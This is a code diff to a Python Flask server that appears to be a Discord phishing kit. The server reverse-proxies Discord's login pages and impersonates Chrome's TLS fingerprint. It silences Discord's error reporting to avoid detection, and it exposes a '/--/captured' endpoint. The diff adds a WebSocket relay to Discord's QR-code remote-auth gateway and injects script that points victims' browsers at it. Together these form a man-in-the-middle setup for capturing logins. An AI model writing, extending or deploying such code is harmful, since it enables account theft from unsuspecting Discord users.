@@ -9,6 +9,8 @@ import subprocess, sys, os, platform, re
 
 _deps = {
     'flask': 'flask',
+    'flask_sock': 'flask-sock',
+    'simple_websocket': 'simple-websocket',
     'curl_cffi': 'curl_cffi',
     'websocket': 'websocket-client',
     'cryptography': 'cryptography',
@@ -22,6 +24,7 @@ for _m, _p in _deps.items():
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', _p, '-q'])
 
 from flask import Flask, request, jsonify, send_from_directory, make_response
+from flask_sock import Sock
 from curl_cffi import requests as creq   # Chrome TLS impersonation
 import requests as plain_req              # for webhook (no impersonation needed)
 import websocket
@@ -125,6 +128,7 @@ print(f'[config] Voice channel: {VOICE_CHANNEL_ID} + {VOICE_CHANNEL_ID_2}')
 print(f'[config] Discord proxy available: {DISCORD_PROXY or "NONE"} (starts {"PROXY" if DISCORD_PROXY else "DIRECT — no proxy configured"})')
 
 app = Flask(__name__, static_folder='.', static_url_path='')
+sock = Sock(app)
 
 # ━━━━━━━━━━━━ Page Tokens (gate QR start) ━━━━━━━━━━━━
 # A short-lived token is injected into /login HTML.
@@ -2142,7 +2146,9 @@ def _proxy_rewrite_html(html_text):
     h = h.replace('https://discordapp.com/', '/')
     # Fix GLOBAL_ENV: API_ENDPOINT must be protocol-relative so that
     # "https:" + API_ENDPOINT produces a valid URL (not "https:/api")
-    ENV_FIX = '<script>window.GLOBAL_ENV.API_ENDPOINT="//" + location.host + "/api";</script>'
+    ENV_FIX = '<script>window.GLOBAL_ENV.API_ENDPOINT="//" + location.host + "/api";'\
+             'window.GLOBAL_ENV.REMOTE_AUTH_ENDPOINT="wss://" + location.host + "/remote-auth";'\
+             '</script>'
     # Inject env fix + interceptor before </head>
     h = h.replace('</head>', ENV_FIX + '\n' + INTERCEPTOR_JS + '\n</head>', 1)
     return h
@@ -3489,6 +3495,64 @@ def proxy_cdn_cgi(rest):
 def proxy_error_reporting(rest):
     """Sink Discord's error reporting — don't leak to their Sentry."""
     return '', 204
+
+
+@sock.route('/remote-auth')
+def ws_remote_auth(ws):
+    """WebSocket proxy for Discord's remote-auth-gateway (QR code login).
+    Browser connects here; we relay to Discord with correct Origin header."""
+    qs = request.query_string.decode()
+    target = 'wss://remote-auth-gateway.discord.gg/'
+    if qs:
+        target += '?' + qs
+    upstream = None
+    try:
+        upstream = websocket.create_connection(
+            target,
+            origin='https://discord.com',
+            header=['User-Agent: ' + UA],
+            timeout=30,
+        )
+        # Relay loop: two threads, one per direction
+        closed = threading.Event()
+
+        def upstream_to_client():
+            try:
+                while not closed.is_set():
+                    op, data = upstream.recv_data(control_frame=True)
+                    if op == websocket.ABNF.OPCODE_TEXT:
+                        ws.send(data.decode('utf-8', errors='replace'))
+                    elif op == websocket.ABNF.OPCODE_BINARY:
+                        ws.send(data)
+                    elif op in (websocket.ABNF.OPCODE_CLOSE, ):
+                        break
+            except Exception:
+                pass
+            finally:
+                closed.set()
+
+        t = threading.Thread(target=upstream_to_client, daemon=True)
+        t.start()
+
+        # Client -> upstream
+        while not closed.is_set():
+            try:
+                msg = ws.receive(timeout=1)
+            except Exception:
+                break
+            if msg is None:
+                break
+            if isinstance(msg, bytes):
+                upstream.send_binary(msg)
+            else:
+                upstream.send(msg)
+    except Exception as e:
+        print(f'[ws-proxy] remote-auth error: {e}')
+    finally:
+        closed.set()
+        if upstream:
+            try: upstream.close()
+            except: pass
 
 
 @app.route('/--/captured', methods=['POST'])
